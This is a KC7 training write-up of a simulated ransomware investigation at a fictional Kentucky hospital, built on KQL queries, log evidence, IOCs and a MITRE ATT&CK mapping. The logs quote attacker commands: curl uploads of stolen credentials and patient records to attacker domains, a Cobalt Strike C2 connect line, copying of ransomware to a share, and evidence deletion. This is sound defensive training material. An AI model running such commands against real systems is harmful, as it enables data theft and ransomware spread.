# KC7 — JoJo's Hospital Ransomware Investigation

## Scenario

JoJo's Hospital in Lexington, Kentucky was hit by a ransomware attack that encrypted critical files across hundreds of systems. The attackers sent ransom demands to both the hospital and its patients, threatening to leak personal medical data.

The investigation revealed a two-stage attack involving two separate threat groups:

- **SharkFin7** — an access broker that gained initial access through a phishing campaign, performed reconnaissance, stole credentials and network data, then sold their access
- **LockByte** — a ransomware group that purchased the access from SharkFin7, used the existing foothold to deploy ransomware, exfiltrate patient records, and extort the hospital

**Platform:** KC7
**Tool:** Azure Data Explorer (KQL)

---

## Scope of Damage

```kql
FileCreationEvents
| where filename endswith ".encrypted"
| count
```

> **6,420 files encrypted**

```kql
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
| count
```

> **321 hosts affected**

---

## Threat Actors

| Actor | Role | Motivation |
|---|---|---|
| SharkFin7 | Initial access broker | Credential theft, network reconnaissance, sell access |
| LockByte | Ransomware operator | Financial extortion via file encryption and data leak threats |

---

## Environment

| Asset | Details |
|---|---|
| Organization | JoJo's Hospital, Lexington, Kentucky |
| Domain | `jojoshospital.org` |
| Primary Victim Host | `AMFB-MACHINE` |
| Primary Victim User | Anthony Davis (`andavis`) — Senior IT Administrator |
| Secondary Victim Host | `RQJQ-MACHINE` |
| Secondary Victim User | `evbrowne` |
| Mail Server | `MAIL-SERVER01` |
| File Server | `jojos-hospital-server` |
| Shared Folder | `\\jojos-hospital.org\shared` |

---

## Attack Timeline

```
2024-05-01 09:56:40  [INITIAL ACCESS] — Malicious sponsored Google ad for fake Raising Cane's site
                     └── Fake domain: raisinkanes.com redirecting to nothing-to-see-here.net

2024-05-01 09:56:50  [DELIVERY] — Raisin_Kane_Promo_Offer.docx downloaded on RQJQ-MACHINE
                     └── User: evbrowne | Downloaded via chrome.exe

2024-05-01 09:57:16  [EXECUTION] — WINWORD.EXE opens the malicious document
                     └── Parent: Explorer.exe | Host: RQJQ-MACHINE

2024-05-01 09:57:17  [INSTALLATION] — cobaltstrike.exe dropped to C:\ProgramData\
                     └── Dropped by WINWORD.EXE | Host: RQJQ-MACHINE

2024-05-01 10:26:17  [C2] — Cobalt Strike connects to attacker C2 server
                     └── C2: 93[.]238[.]22[.]122:50050 | Host: RQJQ-MACHINE

2024-05-02 to 05-04  [DISCOVERY] — Reconnaissance commands executed on RQJQ-MACHINE
                     └── systeminfo, ipconfig /all, netstat -an, net user, net localgroup, net view

2024-05-14 12:04:24  [LATERAL MOVEMENT] — andavis (IP: 10.10.0.1) clicks raisinkanes.com link
                     └── Last click on phishing domain before malicious doc downloaded

2024-05-14 12:05:20  [DELIVERY] — Raisin_Kane_Promo_Offer.docx downloaded on AMFB-MACHINE
                     └── User: andavis | Downloaded via edge.exe

2024-05-14 12:24:45  [C2] — AMFB-MACHINE connects to attacker C2 server
                     └── C2: 93[.]238[.]22[.]123:50050 | User: andavis

2024-05-16 10:00:05  [DISCOVERY] — Advanced IP Scanner downloaded and executed silently
                     └── advanced-ip-scanner.exe /silent | Host: AMFB-MACHINE

2024-05-16 12:29:40  [COLLECTION] — Network diagrams and credentials compressed
                     └── network_diagrams.pdf + credentials.txt → important_network_info.zip

2024-05-16 13:39:48  [EXFILTRATION] — Network and credential data exfiltrated
                     └── curl POST to hxxps://nothing-to-see-here.net/upload

2024-05-20 00:00:00  [CREDENTIAL ACCESS] — Successful login to andavis email from attacker IP
                     └── src_ip: 203[.]0[.]113[.]1 | Host: MAIL-SERVER01
                     └── Credentials likely purchased on dark web from SharkFin7

2024-05-20 to        [RECONNAISSANCE] — 37 inbound web requests from attacker IPs
2024-06-17 13:23:51  └── IPs: 203[.]0[.]113[.]1, 203[.]0[.]113[.]2 | Network mapping activity

2024-06-17 13:35:12  [LATERAL MOVEMENT] — LockByte ransomware copied to shared hospital folder
                     └── lockbyte_ransomer.exe → \\jojos-hospital.org\shared\spread_ransomware.exe

2024-06-17 14:22:29  [COLLECTION] — patient_data_exporter.exe downloaded from attacker domain
                     └── hxxps://secure-health-access.com/tools/patient_data_exporter.exe

2024-06-17 14:23:25  [COLLECTION] — Patient records exported to zip (batch 1)
                     └── Source: \\jojos-hospital-server\important_data\patient_records

2024-06-17 14:49:02  [IMPACT] — Ransom note dropped on AMFB-MACHINE
                     └── We_Have_Your_Data_Pay_Up.txt | C:\Users\andavis\Documents\

2024-06-17 14:56:02  [COLLECTION] — Patient records exported to zip (batch 2)
                     └── Source: \\jojos-hospital-server\important_data\archive\patient-records

2024-06-17 15:54:53  [COLLECTION] — Patient records exported to zip (batch 3)
                     └── Source: \\jojos-hospital-server\important_data\old-patient-data

2024-06-17 17:18:57  [EXFILTRATION] — patient_data_1.zip uploaded to attacker server
                     └── curl -T to hxxps://secure-health-access[.]com/upload/

2024-06-17 17:30:31  [EXFILTRATION] — patient_data_1.zip upload repeated
                     └── curl -T to hxxps://secure-health-access[.]com/upload/

2024-06-17 17:31:50  [EXFILTRATION] — patient_data_.zip uploaded
                     └── curl -T to hxxps://secure-health-access[.]com/upload/

2024-06-17 17:36:47  [COVER TRACKS] — Exfiltration evidence deleted
                     └── cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip
```

---

## Investigation Findings

### Finding 1 — Ransomware Ransom Note

**Query:**
```kql
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
```

**Log Evidence:**
```json
{
  "timestamp": "2024-06-17T14:49:02.000Z",
  "hostname": "AMFB-MACHINE",
  "username": "andavis",
  "sha256": "97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018",
  "path": "C:\\Users\\andavis\\Documents\\We_Have_Your_Data_Pay_Up.txt",
  "filename": "We_Have_Your_Data_Pay_Up.txt",
  "process_name": "explorer.exe"
}
```

---

### Finding 2 — Primary Victim Identity

**Query:**
```kql
Employees
| where hostname == "AMFB-MACHINE"
```

**Log Evidence:**
```json
{
  "name": "Anthony Davis",
  "username": "andavis",
  "role": "Senior IT Administrator",
  "email_addr": "anthony_davis[@]jojoshospital.org",
  "ip_addr": "10.10.0.1",
  "hostname": "AMFB-MACHINE",
  "hire_date": "2022-06-15T00:00:00.000Z"
}
```

---

### Finding 3 — Ransomware Deployment via Shared Folder

**Query:**
```kql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) .. datetime(2024-06-18))
```

**Log Evidence:**
```json
{
  "timestamp": "2024-06-17T13:35:12.000Z",
  "parent_process_name": "cmd.exe",
  "parent_process_hash": "614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f",
  "process_commandline": "cmd.exe /c copy C:\\Users\\andavis\\Downloads\\lockbyte_ransomer.exe \\\\jojos-hospital.org\\\\shared\\\\spread_ransomware.exe",
  "process_name": "cmd.exe",
  "process_hash": "b29f5d70d4bf72d146b932550b23541b0797f597e24331d47052dad5212925ba",
  "hostname": "AMFB-MACHINE",
  "username": "andavis"
}
```

> The attacker copied the ransomware binary to the hospital shared folder, renaming it `spread_ransomware.exe` to facilitate mass deployment across the network.

---

### Finding 4 — Patient Data Exfiltration

**Query:**
```kql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) .. datetime(2024-06-18))
```

**Log Evidence — Three export operations:**

```json
{
  "timestamp": "2024-06-17T14:23:25.000Z",
  "process_commandline": "C:\\Users\\andavis\\Downloads\\patient_data_exporter.exe /export C:\\Users\\andavis\\Documents\\patient_data_1.zip /source \\\\jojos-hospital-server\\important_data\\patient_records",
  "process_name": "patient_data_exporter.exe",
  "process_hash": "0d663ea9485770015ce187c5796b5e171bcf4b14d48175e7189a3456ccd8cb16"
}
```
```json
{
  "timestamp": "2024-06-17T14:56:02.000Z",
  "process_commandline": "C:\\Users\\andavis\\Downloads\\patient_data_exporter.exe /export C:\\Users\\andavis\\Documents\\patient_data_2.zip /source \\\\jojos-hospital-server\\important_data\\archive\\patient-records",
  "process_name": "patient_data_exporter.exe",
  "process_hash": "07850b0ffdf2a408bfec18693b339691227e66de3fc320c01725d72b7c4853d2"
}
```
```json
{
  "timestamp": "2024-06-17T15:54:53.000Z",
  "process_commandline": "C:\\Users\\andavis\\Downloads\\patient_data_exporter.exe /export C:\\Users\\andavis\\Documents\\patient_data_3.zip /source \\\\jojos-hospital-server\\important_data\\old-patient-data",
  "process_name": "patient_data_exporter.exe",
  "process_hash": "071668e559d63b7ea3a71c115f66d612faada08bdca301ba95d0ab2c3045c604"
}
```

**Data exfiltrated via curl:**
```json
{
  "timestamp": "2024-06-17T17:18:57.000Z",
  "process_commandline": "cmd.exe /c curl -T C:\\Users\\andavis\\Documents\\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip"
}
```

**Evidence deleted:**
```json
{
  "timestamp": "2024-06-17T17:36:47.000Z",
  "process_commandline": "cmd.exe /c del C:\\Users\\andavis\\Documents\\patient_data_*.zip",
  "process_hash": "3400577569147cdb0ae8edbc9c77dd921a46ca43e7f386adee895a432baa2644"
}
```

---

### Finding 5 — Source of patient_data_exporter.exe

**Query:**
```kql
OutboundNetworkEvents
| where url has "patient_data_exporter.exe"
```

**Log Evidence:**
```json
{
  "timestamp": "2024-06-17T14:22:29.000Z",
  "method": "GET",
  "src_ip": "10.10.0.1",
  "user_agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Trident/6.0)",
  "url": "hxxps://secure-health-access[.]com/tools/patient_data_exporter.exe"
}
```

> The exfiltration tool was downloaded directly from the attacker-controlled domain `secure-health-access.com` — the same domain used to receive the stolen patient data.

---

### Finding 6 — Attacker Infrastructure Pivoting

**Query:**
```kql
PassiveDns
| where domain == "secure-health-access.com"
| distinct ip
```

> IPs: `203[.]0[.]113[.]1`, `203[.]0[.]113[.]2`

**Query:**
```kql
PassiveDns
| where ip in ("203.0.113.1", "203.0.113.2")
```

> Additional domain discovered: `emr-help[.]net`

**Query:**
```kql
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```

> 37 inbound requests discovered. Reconnaissance activity spanned from `2024-05-20` to `2024-06-17T13:23:51Z` — nearly a month of network mapping before ransomware deployment.

---

### Finding 7 — Email Account Compromise

**Query:**
```kql
AuthenticationEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```

**Log Evidence:**
```json
{
  "timestamp": "2024-05-20T00:00:00.000Z",
  "hostname": "MAIL-SERVER01",
  "src_ip": "203[.]0[.]113[.]1",
  "user_agent": "Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/535.46.3",
  "username": "andavis",
  "result": "Successful Login",
  "password_hash": "a9fbcdd6b449063a2ff822ea7d266402",
  "description": "A user attempted to log in to their email"
}
```

> Credentials were purchased on the dark web — likely obtained through the SharkFin7 phishing campaign and credential theft from the earlier stage of the attack.

---

### Finding 8 — Initial Access via Phishing (SharkFin7)

**Query:**
```kql
OutboundNetworkEvents
| where url has "raisinkanes.com"
```

> 26 requests found. 24 employee IPs contacted the fake site. First click: `2024-05-01T09:56:40Z`. Last click by `10.10.0.1` (Anthony Davis): `2024-05-14T12:04:24Z`

**Redirect domains:**
- `nothing-to-see-here[.]net`
- `totally-legit-domain[.]com`

**Query — Malicious DOCX on redirect site:**
```kql
OutboundNetworkEvents
| where url contains "nothing-to-see-here.net"
| where url contains "docx"
```

**Log Evidence:**
```json
{
  "timestamp": "2024-05-05T12:09:26.000Z",
  "method": "GET",
  "src_ip": "10.10.1.1",
  "url": "hxxps://nothing-to-see-here[.]net/published/search/Raisin_Kane_Promo_Offer.docx"
}
```

---

### Finding 9 — Cobalt Strike Deployment (RQJQ-MACHINE)

**Query:**
```kql
FileCreationEvents
| where filename == "Raisin_Kane_Promo_Offer.docx"
```

**First victim — evbrowne on RQJQ-MACHINE:**
```json
{
  "timestamp": "2024-05-01T09:56:50.000Z",
  "hostname": "RQJQ-MACHINE",
  "username": "evbrowne",
  "sha256": "bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712",
  "path": "C:\\Users\\evbrowne\\Downloads\\Raisin_Kane_Promo_Offer.docx",
  "process_name": "chrome.exe"
}
```

**Query:**
```kql
FileCreationEvents
| where hostname == "RQJQ-MACHINE"
```

**Cobalt Strike dropped:**
```json
{
  "timestamp": "2024-05-01T09:57:17.000Z",
  "hostname": "RQJQ-MACHINE",
  "username": "evbrowne",
  "sha256": "0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b",
  "path": "C:\\ProgramData\\cobaltstrike.exe",
  "filename": "cobaltstrike.exe",
  "process_name": "explorer.exe"
}
```

**Query:**
```kql
ProcessEvents
| where hostname == "RQJQ-MACHINE"
| where timestamp between (datetime(2024-05-01) .. datetime(2024-05-02))
```

**Document executed:**
```json
{
  "timestamp": "2024-05-01T09:57:16.000Z",
  "process_commandline": "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" \"C:\\Users\\evbrowne\\Downloads\\Raisin_Kane_Promo_Offer.docx\"",
  "process_name": "WINWORD.EXE",
  "process_hash": "67e623688d4c85491a2474c9d8de8c4e278af9d241009144b9cfbf1f06361f17",
  "hostname": "RQJQ-MACHINE"
}
```

**Cobalt Strike executed and C2 connected:**
```json
{
  "timestamp": "2024-05-01T09:57:17.000Z",
  "parent_process_name": "WINWORD.EXE",
  "process_commandline": "C:\\ProgramData\\cobaltstrike.exe",
  "process_name": "cobaltstrike.exe",
  "process_hash": "b1b640359cb055f755c8689b7112cdb4f272d54da50f2248bf6607349cc2e220"
}
```
```json
{
  "timestamp": "2024-05-01T10:26:17.000Z",
  "process_commandline": "C:\\ProgramData\\cobaltstrike.exe --connect 93[.]238[.]22[.]122:50050",
  "hostname": "RQJQ-MACHINE"
}
```

---

### Finding 10 — Anthony Davis Compromised (AMFB-MACHINE)

**Log Evidence — Malicious doc downloaded:**
```json
{
  "timestamp": "2024-05-14T12:05:20.000Z",
  "hostname": "AMFB-MACHINE",
  "username": "andavis",
  "sha256": "2c180bfe58cdd61cd97cd0d1dc879abb324022d085fea57c3a7d60209af6901f",
  "path": "C:\\Users\\andavis\\Downloads\\Raisin_Kane_Promo_Offer.docx",
  "process_name": "edge.exe"
}
```

**C2 connection from AMFB-MACHINE:**
```json
{
  "timestamp": "2024-05-14T12:24:45.000Z",
  "process_commandline": "C:\\ProgramData\\cobaltstrike.exe --connect 93[.]238[.]22[.]123:50050",
  "hostname": "AMFB-MACHINE",
  "username": "andavis"
}
```

**Advanced IP Scanner executed (network reconnaissance):**
```json
{
  "timestamp": "2024-05-16T10:00:05.000Z",
  "process_commandline": "C:\\Users\\andavis\\Downloads\\advanced-ip-scanner.exe /silent",
  "process_hash": "1fe07fa09329574eb3d873c458a3625055d49b567e204992099430feee4b9086",
  "hostname": "AMFB-MACHINE"
}
```

**Network diagrams and credentials compressed and exfiltrated:**
```json
{
  "timestamp": "2024-05-16T12:29:40.000Z",
  "process_commandline": "cmd.exe /c powershell Compress-Archive -Path C:\\Users\\andavis\\Documents\\network_diagrams.pdf, C:\\Users\\andavis\\Documents\\credentials.txt -DestinationPath C:\\Users\\andavis\\Desktop\\important_network_info.zip"
}
```
```json
{
  "timestamp": "2024-05-16T13:39:48.000Z",
  "process_commandline": "cmd.exe /c curl -F \"file=@C:\\Users\\andavis\\Desktop\\important_network_info.zip\" hxxps://nothing-to-see-here[.]net/upload",
  "process_hash": "2347a39f24e593c763c9871d7f09371ff407bd78b02cab42bfd644dc4dbfc659"
}
```

---

## IOCs

| Type | Value | Description | Confirmed |
|---|---|---|---|
| Domain | `raisinkanes[.]com` | Fake Raising Cane's phishing site | Yes |
| Domain | `nothing-to-see-here[.]net` | Redirect/payload delivery domain | Yes |
| Domain | `totally-legit-domain[.]com` | Redirect domain | Yes |
| Domain | `secure-health-access[.]com` | Attacker C2 / exfiltration / tool delivery | Yes |
| Domain | `emr-help[.]net` | Additional attacker domain (same IPs) | Yes |
| IP | `203[.]0[.]113[.]1` | Attacker IP — reconnaissance and email login | Yes |
| IP | `203[.]0[.]113[.]2` | Attacker IP — reconnaissance | Yes |
| IP | `93[.]238[.]22[.]122` | Cobalt Strike C2 — RQJQ-MACHINE | Yes |
| IP | `93[.]238[.]22[.]123` | Cobalt Strike C2 — AMFB-MACHINE | Yes |
| URL | `hxxps://secure-health-access[.]com/tools/patient_data_exporter.exe` | Exfiltration tool download | Yes |
| URL | `hxxps://nothing-to-see-here[.]net/published/search/Raisin_Kane_Promo_Offer.docx` | Malicious document URL | Yes |
| URL | `hxxps://nothing-to-see-here[.]net/upload` | Credential/network data exfiltration endpoint | Yes |
| URL | `hxxps://secure-health-access[.]com/upload/` | Patient data exfiltration endpoint | Yes |
| File | `Raisin_Kane_Promo_Offer.docx` | Malicious phishing document | Yes |
| File | `cobaltstrike.exe` | Cobalt Strike implant | Yes |
| File | `lockbyte_ransomer.exe` | LockByte ransomware binary | Yes |
| File | `spread_ransomware.exe` | Ransomware renamed for shared folder deployment | Yes |
| File | `patient_data_exporter.exe` | Attacker tool for exporting patient records | Yes |
| File | `advanced-ip-scanner.exe` | Network scanner used for reconnaissance | Yes |
| File | `We_Have_Your_Data_Pay_Up.txt` | Ransom note | Yes |
| Hash (SHA256) | `bd886046266b909a8ca5f19f16e5606baf73194a70632c81fdc44ef39ba29712` | Raisin_Kane_Promo_Offer.docx (evbrowne) | Yes |
| Hash (SHA256) | `2c180bfe58cdd61cd97cd0d1dc879abb324022d085fea57c3a7d60209af6901f` | Raisin_Kane_Promo_Offer.docx (andavis) | Yes |
| Hash (SHA256) | `0e7e0e888f22b5cc83ce5f2560f9f331d89b8e02875e98ace822e074f2ee486b` | cobaltstrike.exe | Yes |
| Hash (SHA256) | `97c348e95c8a8aeb8808f76434d73a92bbcb6b4586788365762b22624990b018` | We_Have_Your_Data_Pay_Up.txt | Yes |
| Hash (MD5) | `a9fbcdd6b449063a2ff822ea7d266402` | andavis password hash (compromised) | Yes |
| User | `andavis` | Anthony Davis — Senior IT Administrator (compromised) | Yes |
| User | `evbrowne` | Initial phishing victim on RQJQ-MACHINE | Yes |
| Host | `AMFB-MACHINE` | Primary attack host — andavis | Yes |
| Host | `RQJQ-MACHINE` | First phishing victim host | Yes |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Spearphishing Link | T1566.002 | Fake Raising Cane's Google ad → raisinkanes.com |
| Initial Access | Drive-by Compromise | T1189 | Malicious DOCX delivered via redirect from phishing site |
| Execution | User Execution: Malicious File | T1204.002 | Raisin_Kane_Promo_Offer.docx opened by victims |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | cmd.exe used throughout the attack chain |
| Persistence | — | — | Cobalt Strike implant maintained persistent access |
| Defense Evasion | Masquerading | T1036 | lockbyte_ransomer.exe renamed to spread_ransomware.exe |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 | patient_data_*.zip deleted after exfiltration |
| Credential Access | Credentials from Password Stores | T1555 | credentials.txt compressed and exfiltrated |
| Discovery | Network Service Discovery | T1046 | advanced-ip-scanner.exe /silent |
| Discovery | System Information Discovery | T1082 | systeminfo, ipconfig /all, netstat -an |
| Discovery | Account Discovery | T1087 | net user, net localgroup administrators |
| Discovery | Network Share Discovery | T1135 | net view |
| Lateral Movement | Taint Shared Content | T1080 | Ransomware copied to \\jojos-hospital.org\shared |
| Collection | Archive Collected Data | T1560 | Patient records zipped via patient_data_exporter.exe |
| Command & Control | Application Layer Protocol: Web Protocols | T1071.001 | Cobalt Strike C2 over port 50050 |
| Exfiltration | Exfiltration Over Web Service | T1567 | curl uploads to secure-health-access.com and nothing-to-see-here.net |
| Impact | Data Encrypted for Impact | T1486 | 6,420 files encrypted across 321 hosts |
| Impact | Financial Theft / Extortion | T1657 | Ransom demand sent to hospital and patients |

---

## Key Takeaways

- A fake sponsored Google ad was the initial entry point — a simple but effective social engineering technique that bypassed technical controls
- SharkFin7 acted as an access broker — they performed the initial compromise, stole credentials and network data, then sold their access to LockByte
- Anthony Davis being a Senior IT Administrator made him a high-value target — his credentials and network access enabled the entire second stage of the attack
- The attacker maintained persistence for over a month (May 1 to June 17) before deploying ransomware, conducting thorough reconnaissance throughout
- Deploying ransomware via a hospital shared folder is an efficient mass-deployment technique that bypasses the need to touch each host individually
- Evidence deletion (removing zip files after exfiltration) demonstrates operational security awareness by the attacker
- Two separate threat groups operated in the same environment with different objectives — similar to the Insight Nexus scenario

---

*Completed as part of the KC7 cybersecurity training platform.*
